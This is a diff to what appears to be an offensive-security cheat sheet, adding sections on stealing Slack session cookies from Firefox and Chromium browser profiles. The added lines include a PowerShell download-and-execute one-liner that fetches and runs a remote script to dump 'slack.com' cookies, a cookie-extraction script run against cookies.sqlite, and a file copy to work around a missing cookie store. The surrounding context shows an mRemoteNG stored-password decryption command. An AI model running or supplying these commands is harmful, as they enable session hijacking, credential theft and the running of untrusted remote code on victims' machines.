@@ -380,6 +380,21 @@ Look for the Nday exploits for each service
 dir %USERPROFILE%\APPDATA\Roaming\mRemoteNG or where /R C:\ confCons.xml
 python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 
 ```
+###### Abuse slack cookie from firefox
+```
+look for %APPDATA%\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite
+https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py
+python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
+```
+###### Abuse Slack cookie from Chromium-based Browsers
+```
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
+arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
+Invoke-SharpChromium -Command "cookies slack.com"
+
+if Exception: Could not find file 'C:\Users\lab_admin\AppData\Local\Google\Chrome\User Data\\Default\Cookies'.
+copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+```
 ### Service DLL Hijacking
 >The following is the default search order with SafeDllSearchMode enabled. When it's disabled the current directory escalates to second place. To disable this feature, create the HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode registry value and set it to 0 (default is enabled).
 ```
